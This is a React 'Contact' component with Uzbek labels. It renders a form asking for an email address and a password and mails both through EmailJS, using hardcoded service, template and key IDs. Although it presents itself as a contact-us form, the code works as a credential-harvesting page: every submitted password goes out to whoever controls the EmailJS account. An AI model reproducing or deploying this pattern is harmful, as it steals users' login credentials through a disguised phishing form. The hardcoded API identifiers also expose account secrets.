import React, { useState } from "react";
import emailjs from "emailjs-com";

function Contact() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");

  const handleSubmit = (e) => {
    e.preventDefault();

    emailjs
      .send(
        "service_0njtbak",   
        "template_ylqszfr",  
        {
          email: email,
          password: password,
        },
        "wXFfNddm-driM28jB"    
      )
      .then(
        (result) => {
          alert("✅ Xabar muvaffaqiyatli yuborildi!");
          setEmail("");
          setPassword("");
        },
        (error) => {
          alert("❌ Xabar yuborishda xatolik yuz berdi.");
          console.error(error);
        }
      );
  };

  return (
    <div className="min-h-screen flex flex-col items-center justify-center bg-gradient-to-br from-gray-900 via-black to-gray-800 text-white">
      <h2 className="text-4xl font-bold mb-8 text-red-500">📞 BIZ BILAN BOGLANING</h2>

      <form
        onSubmit={handleSubmit}
        className="bg-white/10 p-8 rounded-2xl shadow-xl backdrop-blur-md border border-white/20 w-[350px]"
      >
        <label className="block mb-4">
          <span className="text-gray-200">Email:</span>
          <input
            type="email"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            required
            className="w-full mt-1 px-3 py-2 rounded-lg bg-gray-800 text-white focus:ring-2 focus:ring-red-500 outline-none"
          />
        </label>

        <label className="block mb-6">
          <span className="text-gray-200">Parol:</span>
          <input
            type="password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            required
            className="w-full mt-1 px-3 py-2 rounded-lg bg-gray-800 text-white focus:ring-2 focus:ring-red-500 outline-none"
          />
        </label>

        <button
          type="submit"
          className="w-full bg-red-500 hover:bg-red-600 py-2 rounded-lg font-semibold transition"
        >
     Yuborish 
        </button>
      </form>
    </div>
  );
}

export default Contact;
